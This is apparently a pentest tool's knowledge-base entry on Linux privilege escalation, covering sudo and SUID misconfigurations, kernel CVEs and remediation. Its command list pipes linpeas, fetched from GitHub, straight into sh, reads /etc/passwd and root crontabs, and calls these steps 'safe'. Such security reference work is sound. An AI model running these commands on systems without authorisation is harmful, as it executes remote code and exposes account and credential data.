---
id: os-linux-privesc
technology: "Linux Privilege Escalation (sudo/SUID/kernel)"
domain: IT
category: os
transport: ip
safety_class: intrusive
severity: critical
life_safety: false
match:
  ports: []
  banners: []
  markers: ["uname -r", "sudo -l", "/etc/passwd", "SUID", "LD_PRELOAD"]
quick_wins:
  - { cmd: "uname -a && cat /etc/os-release && id && sudo -l 2>/dev/null", safety: safe, note: "Enumerate kernel version, OS, current user, and sudo permissions — read-only post-access check." }
  - { cmd: "find / -perm -4000 -type f 2>/dev/null | tee /tmp/suid_list.txt", safety: safe, note: "Find all SUID-set binaries on the filesystem — read-only enumeration." }
  - { cmd: "curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null", safety: safe, note: "Download and run linpeas automated local privilege escalation enumeration — read-only; generates significant filesystem access noise." }
  - { cmd: "grep -v 'nologin\\|false' /etc/passwd && cat /var/spool/cron/crontabs/* 2>/dev/null", safety: safe, note: "Enumerate interactive user accounts and cron jobs — read-only." }
  - { cmd: "linux-exploit-suggester.sh 2>/dev/null | grep -i 'CVE\\|exploit'", safety: safe, note: "Cross-reference kernel version against known privilege escalation CVEs — read-only." }
references: ["CVE-2021-4034 (PwnKit/pkexec)", "CVE-2021-3156 (Sudo Baron Samedit)", "CVE-2022-0847 (Dirty Pipe)", "CVE-2016-5195 (Dirty COW)", "KEV CVE-2021-4034"]
mitre: "T1068"
---
# Linux Privilege Escalation (sudo / SUID / kernel)

Linux privilege escalation covers the techniques an attacker uses to move from a low-privileged shell to `root` (UID 0) after initial access. The attack surface is broad: **sudo misconfigurations** (ALL=(ALL) NOPASSWD entries, unsafe sudo rules from GTFOBins), **SUID/SGID binaries** (writable interpreters, environment-variable injection via LD_PRELOAD), **kernel exploits** (Dirty COW, Dirty Pipe, PwnKit), **cron jobs running as root with world-writable scripts**, **weak file permissions** on sensitive files like `/etc/passwd` or private keys, and **container escapes** (privileged Docker containers, mounted host paths).

**High-impact CVEs.** PwnKit (CVE-2021-4034) is a trivially exploitable local privilege escalation in `pkexec` shipped in virtually all Linux distributions; it was added to CISA's KEV list and requires no arguments and no special environment. Baron Samedit (CVE-2021-3156) exploited a heap overflow in `sudo` present for roughly 10 years. Dirty Pipe (CVE-2022-0847) allowed overwriting read-only files via the page cache. All are patched but remain unpatched on legacy or poorly maintained systems.

**Safe-first testing.** After obtaining a shell, run read-only enumeration tools: `linpeas.sh` (very thorough), `linux-exploit-suggester`, or manual one-liners to collect kernel version, sudo rules, SUID binaries, cron jobs, and writable paths. These are passive information-gathering steps that do not modify system state. Cross-reference `sudo -l` output against GTFOBins (gtfobins.github.io) to identify escalation paths before executing any exploit. Kernel exploits should only be attempted in isolated environments with snapshots; many older kernel exploits cause kernel panics or filesystem corruption.

**Remediation.** Apply kernel and package updates on a regular cadence; audit `sudo` rules and remove `NOPASSWD` and wildcard entries; strip unnecessary SUID bits (`chmod u-s`); use `nosuid` mount options on user-writable filesystems; implement AppArmor or SELinux mandatory access controls; restrict `LD_PRELOAD` and `LD_LIBRARY_PATH` inheritance in sudo; and monitor `/var/log/auth.log` for sudo usage anomalies.
